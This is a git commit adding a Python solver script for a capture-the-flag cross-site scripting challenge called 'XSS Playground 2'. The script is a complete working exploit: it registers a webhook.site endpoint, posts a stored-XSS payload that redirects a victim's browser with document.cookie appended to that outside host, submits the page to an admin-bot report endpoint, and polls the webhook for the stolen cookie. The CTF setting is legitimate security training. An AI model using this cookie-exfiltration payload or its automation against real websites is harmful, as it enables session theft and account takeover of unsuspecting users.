bb3217bce2757b1b1e89443ebf91e384c07dffbe
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-07 19:15:25 +1000

    XSS Playground 2

---
+++ ctf/4-XSS/xss_playground_2.py
@@ -0,0 +1,37 @@
+import sys
+from pathlib import Path
+sys.path.append(str(Path(__file__).resolve().parent.parent))
+from utils import get_session, find_flag
+
+import json
+import time
+
+BASE_URL = "https://xss-playground-2.quoccacorp.com"
+
+class Solver:
+    def __init__(self):
+        self.session = get_session()
+        self.webhooksite_uuid = self.get_webhooksite_uuid()
+        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
+        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
+
+    def get_webhooksite_uuid(self):
+        response = self.session.post("https://webhook.site/token")
+        return response.json()["uuid"]
+
+    def find_flag_webhooksite(self, delay_seconds=1.5):
+        time.sleep(delay_seconds)
+        response = self.session.get(self.webhooksite_requests_url)
+        response_json = response.json()
+        response_json_text = json.dumps(response_json, indent=2)
+        find_flag(response_json_text)
+
+    def main(self):
+        PAYLOAD = f'<script>document.location = "{self.webhooksite_url}?q=" + document.cookie</script>'
+
+        response = self.session.post(BASE_URL, data={"paste": PAYLOAD})
+        self.session.post(f"{BASE_URL}/report", data={"url": response.url})
+        self.find_flag_webhooksite()
+
+if __name__ == "__main__":
+    Solver().main()
